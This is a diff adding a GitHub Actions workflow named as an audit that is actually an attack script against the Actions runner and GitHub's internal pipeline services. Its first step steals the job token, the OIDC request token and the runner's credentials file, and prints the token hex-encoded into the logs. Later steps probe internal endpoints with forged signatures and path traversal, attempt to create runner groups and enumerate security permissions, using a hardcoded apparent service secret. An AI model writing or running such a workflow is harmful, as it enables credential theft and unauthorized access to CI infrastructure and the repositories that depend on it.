@@ -1,0 +1,294 @@
+name: Audit v43
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v43:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V43 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: FULL routeTemplates from pipeline ServiceDefinitions
+      # v41: RT gets 95 defs but we only extracted name/id
+      # Need the routeTemplate field with path params!
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Route templates
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== ROUTE TEMPLATES ==="
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+
+          # Full ServiceDefinitions with routeTemplate
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$PIPE/_apis/ServiceDefinitions")
+          echo "$R" | python3 -c "
+          import json,sys
+          d=json.load(sys.stdin)
+          for s in d.get('value',[]):
+            st=s.get('serviceType','')
+            disp=s.get('displayName','')
+            ident=s.get('identifier','')
+            rt=s.get('routeTemplate','')
+            area=s.get('resourceAreaIdentifier','')
+            rv=s.get('resourceVersion',0)
+            maxv=s.get('maxVersion','')
+            minv=s.get('minVersion','')
+            locs=s.get('locationMappings',[])
+            loc_strs=[]
+            for l in locs:
+              loc=l.get('location','')
+              mon=l.get('accessMappingMoniker','')
+              if loc: loc_strs.append(f'{mon}={loc}')
+            loc_str=' | '.join(loc_strs[:2])
+            print(f'{st} | {disp} | route={rt} | area={area} | v={minv}-{maxv} | {loc_str}')
+          " 2>/dev/null
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: signedlogcontent exploitation
+      # v42: HTTP_400 "Missing parameter: urlSignature"!
+      # Also signedsummary and signedartifactscontent
+      # Try different urlSignature values, empty, traversal params
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Signed content exploit
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SIGNED CONTENT EXPLOIT ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          RUNID="${{ github.run_id }}"
+
+          # A: signedlogcontent with various urlSignature values
+          echo "--- A: signedlogcontent ---"
+          for SIG in \
+            "" \
+            "test" \
+            "null" \
+            "0" \
+            "1" \
+            "*" \
+            "true" \
+            "undefined" \
+            "AAAA" \
+            "%00" \
+            "../../../../etc/passwd" \
+            "." \
+            "admin"; do
+            for TOK_NAME in RT IDTOK; do
+              eval TOK=\$$TOK_NAME
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $TOK" \
+                "$PIPE/_apis/pipelines/$RUNID/runs/1/signedlogcontent?urlSignature=$SIG")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "A $TOK_NAME sig=$SIG = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # B: signedsummary
+          echo "--- B: signedsummary ---"
+          for SIG in "" "test" "0" "*"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              "$PIPE/_apis/pipelines/$RUNID/runs/1/signedsummary?urlSignature=$SIG")
+            CODE=$(echo "$R" | tail -1)
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "B sig=$SIG = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+          echo ""
+
+          # C: signedartifactscontent
+          echo "--- C: signedartifactscontent ---"
+          for SIG in "" "test" "0" "*"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              "$PIPE/_apis/pipelines/$RUNID/runs/1/signedartifactscontent?urlSignature=$SIG")
+            CODE=$(echo "$R" | tail -1)
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "C sig=$SIG = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+          echo ""
+
+          # D: Try different run numbers and with IDTOK
+          echo "--- D: Different runs ---"
+          for RUN_NUM in 1 2 0; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" \
+              "$PIPE/_apis/pipelines/$RUNID/runs/$RUN_NUM/signedlogcontent?urlSignature=")
+            CODE=$(echo "$R" | tail -1)
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "D IDTOK run=$RUN_NUM = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+
+          # E: Without the /runs/ path segment
+          echo "--- E: Alternate paths ---"
+          for EP in \
+            "/_apis/pipelines/signedlogcontent?urlSignature=" \
+            "/_apis/pipelines/runs/signedlogcontent?urlSignature=" \
+            "/_apis/pipelines/$RUNID/signedlogcontent?urlSignature=" \
+            "/_apis/pipelines/logs?urlSignature=test" \
+            "/_apis/pipelines/artifacts?urlSignature=test"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$PIPE$EP")
+            CODE=$(echo "$R" | tail -1)
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "E $EP = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: IDTOK runtime routes + vstoken security
+      # v42: runnerscalesets=200. Try ALL runtime identifiers.
+      # Also: vstoken security endpoints for permission enumeration
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Runtime + security
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUNTIME + SECURITY ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          VS="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+          RUNID="${{ github.run_id }}"
+
+          # A: All runtime routes with IDTOK
+          echo "--- A: Runtime routes (IDTOK) ---"
+          for ROUTE in \
+            "/_apis/runtime/runnerscalesets" \
+            "/_apis/runtime/runnerscalesets/1" \
+            "/_apis/runtime/runnerscalesets/1/sessions" \
+            "/_apis/runtime/runnerscalesets/1/messages" \
+            "/_apis/runtime/runnergroups" \
+            "/_apis/runtime/runnergroups/1" \
+            "/_apis/runtime/visibility" \
+            "/_apis/runtime/generatejitconfig" \
+            "/_apis/runtime/acquirablejobs" \
+            "/_apis/runtime/sessions" \
+            "/_apis/runtime/messages" \
+            "/_apis/runtime/acquire" \
+            "/_apis/runtime/acquirejobs"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$PIPE$ROUTE")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "A GET $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # B: Runtime POST routes with IDTOK
+          echo "--- B: Runtime POST (IDTOK) ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$PIPE/_apis/runtime/runnerscalesets" \
+            -d '{"name":"v43-scaleset","runnerGroupId":1}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B POST runnerscalesets = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+            "$PIPE/_apis/runtime/runnergroups" \
+            -d '{"name":"v43-group"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B POST runnergroups = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          echo ""
+
+          # C: vstoken security namespace enumeration
+          echo "--- C: vstoken security ---"
+          for ROUTE in \
+            "/_apis/security/SecurityNamespaces" \
+            "/_apis/security/SecurityNamespaces?api-version=5.0" \
+            "/_apis/security/AccessControlLists" \
+            "/_apis/security/AccessControlLists?api-version=5.0" \
+            "/_apis/security/Permissions" \
+            "/_apis/security/Permissions?api-version=5.0" \
+            "/_apis/FeatureAvailability/FeatureFlags" \
+            "/_apis/FeatureAvailability/FeatureFlags?api-version=5.0" \
+            "/_apis/Health/Health" \
+            "/_apis/notification/Subscriptions" \
+            "/_apis/notification/Events"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$VS$ROUTE")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "C $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V43 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V43 COMPLETE ==="
